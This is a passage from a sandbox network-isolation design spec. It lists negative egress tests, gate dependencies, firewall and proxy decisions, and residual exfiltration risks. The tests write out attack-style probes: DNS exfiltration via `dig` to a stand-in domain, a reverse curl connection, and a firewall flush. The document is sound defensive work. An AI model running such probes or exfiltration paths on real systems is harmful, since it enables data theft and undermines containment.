| `NEG-0D-12` | Raw DNS Exfiltration (L3 Drop) | `dig @127.0.0.11 secret.example.com` | Connection timed out / No servers reachable (Host WAN `tcpdump port 53` must show 0 egress packets) |
| `NEG-0D-13` | Proxy Reverse Connection | From proxy: `curl -m 2 http://172.30.1.2:80` | Dropped by host forward filter (Timeout) |
| `NEG-0D-14` | Proxy Container Stopped | Stop proxy container; run `POS-0D-01` | Connection refused / Proxy unreachable (Fails closed) |
| `NEG-0D-15` | Missing/Flushed Host Firewall | Flush `atm_confinement` ruleset; run preflight | Canary probe connects to blocked canary target; preflight detects missing firewall and aborts container launch (Fails closed) |

---

## 9. Gate Dependencies & Relationship to Other Gates

- **Gate 0A & 0B (Runtime Foundation & Docker Engine):**
  - Gate 0D builds directly upon the qualified non-root, capability-dropped sandbox container contract established in Gate 0A and 0B (`docs/superpowers/verification/2026-10-11-runtime-qualification-gates-0a-0b.md`).
- **Gate 0C (Credential-Safe Git Transfer):**
  - Gate 0D enforces the network isolation boundary required by Gate 0C. Direct Git operations against GitHub from inside the sandbox are blocked at the proxy layer, ensuring all Git transfers must use the control-plane bundle helper.
- **Gate 0G (Model Credential Isolation):**
  - Direct egress to LLM provider endpoints (`api.anthropic.com`, `api.openai.com`) remains blocked under Gate 0D until Gate 0G formally decides and qualifies the model provider credential delivery architecture.

---

## 10. Summary of Architectural Decisions & Unresolved Risks

### 10.1 Decisions Defined in this Specification
1. **Adoption of Direction C (Hybrid Filtering):** Host-owned kernel packet filtering restricts Layer 3/4 forwarding exclusively to a dedicated forward proxy on an isolated DMZ network. The forward proxy restricts Layer 7 HTTPS tunneling via an exact FQDN allowlist.
2. **Strict Default-Deny Policy:** All direct IP egress, RFC 1918 traffic, cloud metadata, host loopback, and peer project bridges are blocked.
3. **Explicit Package Registry Allowlist:** Allowlist is restricted to official package managers (npm, PyPI, Go, Crates, NuGet, Maven). Wildcards and multi-tenant CDNs are banned.

### 10.2 Open Architectural Blockers & Residual Risks
1. **Pre-Implementation Blocker (Host Firewall Verification):** How ATM reliably verifies the health of operator-managed host firewall rules without possessing host root privileges remains a blocker requiring user/operator agreement before implementation begins.
2. **Container DNS Resolution Behavior:** The behavior of `--dns=127.0.0.1` in suppressing `127.0.0.11` forwarding must be empirically tested on the authorized qualification host.
3. **No TLS Interception (MITM):** Because TLS inspection is not performed, payload exfiltration through legitimate HTTPS `CONNECT` tunnels to allowlisted domains remains a residual risk, mitigated by absence of credentials inside the sandbox.
4. **Shared Proxy Compromise & Public Egress Blast Radius:** The shared forward proxy is a cross-project trust component. Host-level stateful packet filtering successfully isolates the proxy from reaching host services or project bridge interfaces. However, if the proxy process itself is compromised (or proxy policy bypassed), an adversary could potentially exfiltrate data to arbitrary external endpoints over the proxy's allowed outbound WAN protocols (TCP 443, UDP/TCP 53). Restricting proxy DNS egress to an operator-configured upstream DNS resolver IP (rather than arbitrary WAN DNS servers) mitigates this risk; where unconstrained WAN DNS egress remains permitted, it must be acknowledged as a residual risk. Under no circumstances should the shared proxy be considered to have zero blast radius upon container compromise.
